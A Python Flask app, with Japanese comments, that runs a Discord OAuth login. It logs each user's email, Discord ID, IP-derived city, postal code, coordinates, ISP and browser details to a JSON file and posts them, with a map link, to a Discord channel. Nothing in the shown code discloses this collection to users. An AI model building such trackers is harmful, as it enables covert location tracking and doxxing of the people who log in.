# main.py
import os
import json
import threading
from datetime import datetime
from flask import Flask, request, render_template
from dotenv import load_dotenv
import requests
from user_agents import parse

from discord_bot import bot, enqueue_task

load_dotenv()
app = Flask(__name__)

ACCESS_LOG_FILE = "access_log.json"

DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
IPINFO_TOKEN = os.getenv("IPINFO_TOKEN", "").strip()  # 任意

# -----------------------
# Utilities
# -----------------------
def get_client_ip():
    # Render / 逆プロキシ配下を考慮
    h = request.headers
    if "Cf-Connecting-Ip" in h:
        return h.get("Cf-Connecting-Ip")
    if "X-Forwarded-For" in h:
        return h["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr

def _fetch_ipinfo(ip):
    """
    ipinfo で city/region/postal/loc を優先取得
    """
    url = f"https://ipinfo.io/{ip}/json"
    headers = {}
    params = {}
    if IPINFO_TOKEN:
        params["token"] = IPINFO_TOKEN
    r = requests.get(url, headers=headers, params=params, timeout=5)
    if r.status_code != 200:
        return None
    d = r.json()
    loc = (d.get("loc") or "0,0").split(",")
    lat = float(loc[0]) if len(loc) == 2 else None
    lon = float(loc[1]) if len(loc) == 2 else None
    org = d.get("org") or ""
    asn, isp = None, None
    if org.startswith("AS"):
        parts = org.split(" ", 1)
        asn = parts[0]
        isp = parts[1] if len(parts) > 1 else None
    return {
        "ip": d.get("ip") or ip,
        "country": d.get("country"),   # JP など（2文字）
        "region": d.get("region"),
        "city": d.get("city"),
        "zip": d.get("postal"),
        "lat": lat,
        "lon": lon,
        "isp": isp or org or "不明",
        "as": asn or "不明",
        "proxy": False,        # ipinfo free では proxy 判定なし
        "hosting": False,      # 同上
        "source": "ipinfo",
    }

def _fetch_ipapi(ip):
    """
    ip-api.com (lang=ja) で補完（proxy/hosting/AS/ISP/緯度経度など）
    """
    url = f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,countryCode,regionName,city,zip,isp,as,lat,lon,proxy,hosting,query"
    r = requests.get(url, timeout=5)
    if r.status_code != 200:
        return None
    d = r.json()
    if d.get("status") != "success":
        return None
    return {
        "ip": d.get("query") or ip,
        "country": d.get("countryCode") or d.get("country"),  # 可能なら2文字
        "region": d.get("regionName"),
        "city": d.get("city"),
        "zip": d.get("zip"),
        "lat": d.get("lat"),
        "lon": d.get("lon"),
        "isp": (d.get("isp") or "不明"),
        "as": (d.get("as") or "不明"),
        "proxy": bool(d.get("proxy")),
        "hosting": bool(d.get("hosting")),
        "source": "ip-api",
        "country_ja": d.get("country"),  # 「日本」などの日本語名称
    }

def _merge_geo(pref_ipinfo, pref_ipapi):
    """
    ipinfo を優先しつつ、欠けた項目を ip-api で補完。
    市区町村/郵便番号/緯度経度は ipinfo を優先（実測的に細かいことが多い）。
    """
    a = pref_ipinfo or {}
    b = pref_ipapi or {}

    def pick(*keys, prefer_a=True):
        res = {}
        for k in keys:
            va = a.get(k)
            vb = b.get(k)
            res[k] = va if (prefer_a and va not in (None, "", "不明")) else (vb if vb not in (None, "", "不明") else va or vb)
        return res

    out = {}
    out.update(pick("ip", "country", "region", "city", "zip", "lat", "lon", prefer_a=True))
    out["isp"] = a.get("isp") or b.get("isp") or "不明"
    out["as"] = a.get("as") or b.get("as") or "不明"
    out["proxy"] = a.get("proxy") if a.get("proxy") is not None else (b.get("proxy") or False)
    out["hosting"] = a.get("hosting") if a.get("hosting") is not None else (b.get("hosting") or False)
    # 国名（日本語表示）をできる限り
    country_code = out.get("country")
    country_ja = b.get("country_ja")
    if country_ja:
        out["country_name"] = country_ja
    else:
        # 簡易マッピング（必要に応じて追加）
        code2ja = {"JP": "日本"}
        out["country_name"] = code2ja.get(country_code, country_code or "不明")

    return out

def get_geo_info(ip: str):
    """
    PC の実出口IPの位置を『市/郵便番号/緯度経度』まで可能な限り取得。
    """
    info1 = None
    try:
        info1 = _fetch_ipinfo(ip)
    except Exception:
        info1 = None

    info2 = None
    try:
        info2 = _fetch_ipapi(ip)
    except Exception:
        info2 = None

    if not info1 and not info2:
        return {
            "ip": ip, "country": "不明", "region": "不明", "city": "不明", "zip": "不明",
            "lat": None, "lon": None, "isp": "不明", "as": "不明",
            "proxy": False, "hosting": False, "country_name": "不明"
        }

    merged = _merge_geo(info1, info2)
    return merged

def save_log(discord_id, data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    logs = {}
    if os.path.exists(ACCESS_LOG_FILE):
        try:
            with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
                logs = json.load(f)
        except Exception:
            logs = {}

    if discord_id not in logs:
        logs[discord_id] = {"history": []}

    data["timestamp"] = now
    logs[discord_id]["history"].append(data)

    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

# -----------------------
# Routes
# -----------------------
@app.route("/")
def index():
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={DISCORD_REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
    )
    return render_template("index.html", discord_auth_url=discord_auth_url)

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    # 1) Discord OAuth2 token
    token_res = requests.post(
        "https://discord.com/api/oauth2/token",
        data={
            "client_id": DISCORD_CLIENT_ID,
            "client_secret": DISCORD_CLIENT_SECRET,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": DISCORD_REDIRECT_URI,
            "scope": "identify email guilds connections",
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=10
    )
    token_res.raise_for_status()
    token_json = token_res.json()
    access_token = token_json.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    # 2) Discord user
    user_res = requests.get(
        "https://discord.com/api/users/@me",
        headers={"Authorization": f"Bearer {access_token}"},
        timeout=10
    )
    user = user_res.json()

    # 3) Geo
    ip = get_client_ip()
    geo = get_geo_info(ip)

    # 4) UA
    ua_raw = request.headers.get("User-Agent", "")
    ua = parse(ua_raw)
    ua_browser = f"{ua.browser.family} {ua.browser.version_string}".strip()
    ua_os = f"{ua.os.family} {ua.os.version_string}".strip()
    ua_device = ("Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "PC" if ua.is_pc else "Other")

    # 5) Build log payload (県/市/郵便番号はPCの出口IPに基づく)
    lat = geo.get("lat")
    lon = geo.get("lon")
    map_link = f"https://www.google.com/maps?q={lat:.4f},{lon:.4f}" if (isinstance(lat, (float, int)) and isinstance(lon, (float, int))) else None

    # Discord アバター
    avatar_url = (
        f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024"
        if user.get("avatar")
        else "https://cdn.discordapp.com/embed/avatars/0.png"
    )

    # 保存用
    log_data = {
        "username": f"{user.get('username')}#{user.get('discriminator')}",
        "email": user.get("email"),
        "ip": geo.get("ip"),
        "country": geo.get("country"),
        "region": geo.get("region"),
        "city": geo.get("city"),
        "zip": geo.get("zip"),
        "lat": lat,
        "lon": lon,
        "isp": geo.get("isp"),
        "as": geo.get("as"),
        "proxy": geo.get("proxy"),
        "hosting": geo.get("hosting"),
        "browser": ua_browser,
        "os": ua_os,
        "device": ua_device,
        "map_link": map_link,
    }
    save_log(user.get("id"), log_data)

    # 6) Discord 送信（あなたが望むレイアウト）
    country_name = geo.get("country_name") or geo.get("country") or "不明"
    desc_lines = [
        f"**名前:** {user.get('username')}#{user.get('discriminator')}",
        f"**ID:** {user.get('id')}",
        f"**メール:** {user.get('email')}",
        f"**Premium:** {user.get('premium_type', 0)} / Locale: {user.get('locale')}",
        f"**IP:** {geo.get('ip')} / Proxy: {bool(geo.get('proxy'))} / Hosting: {bool(geo.get('hosting'))}",
        f"**国:** {country_name} / {geo.get('region') or '不明'} / {geo.get('city') or '不明'} / {geo.get('zip') or '不明'}",
        f"**ISP:** {geo.get('isp') or '不明'} / AS: {geo.get('as') or '不明'}",
        f"**UA:** {ua_raw}",
        f"**OS:** {ua_os} / ブラウザ: {ua_browser}",
        f"**デバイス:** {ua_device}",
    ]
    if map_link:
        desc_lines.append(f"📍 [地図リンク]({map_link})")

    embed_data = {
        "title": "✅ 新しいアクセスログ",
        "description": "\n".join(desc_lines),
        "thumbnail": {"url": avatar_url},
    }
    enqueue_task(embed_data=embed_data, user_id=user.get("id"))

    # 7) 警告（任意）
    if geo.get("proxy") or geo.get("hosting"):
        warn_embed = {
            "title": "⚠️ 不審なアクセス検出",
            "description": (
                f"{user.get('username')}#{user.get('discriminator')} (ID: {user.get('id')})\n"
                f"IP: {geo.get('ip')} / Proxy: {bool(geo.get('proxy'))} / Hosting: {bool(geo.get('hosting'))}"
            ),
        }
        enqueue_task(embed_data=warn_embed)

    return render_template(
        "welcome.html",
        username=f"{user.get('username')}#{user.get('discriminator')}"
    )

# -----------------------
# 起動（Flaskより先にBotを別スレッドで）
# -----------------------
def start_bot_thread():
    def run_bot():
        bot.run(os.getenv("DISCORD_BOT_TOKEN"))
    threading.Thread(target=run_bot, daemon=True).start()

if __name__ == "__main__":
    start_bot_thread()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", "10000")))
